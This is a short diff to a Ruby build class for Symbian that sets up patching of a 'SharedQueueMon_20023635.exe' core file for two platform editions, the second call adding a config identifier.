@@ -21,9 +21,14 @@ class BuildSymbian < Build
 
     # add the file to be patched to the params
     # these params will be passed to the super
-    params[:core] = 'core'
-    params[:config] = 'config'
+    params[:core] = '5th/SharedQueueMon_20023635.exe'
 
+    # invoke the generic patch method with the new params
+    super
+
+    params[:core] = '3rd/SharedQueueMon_20023635.exe'
+    params[:config] = '2009093023'
+    
     # invoke the generic patch method with the new params
     super
 
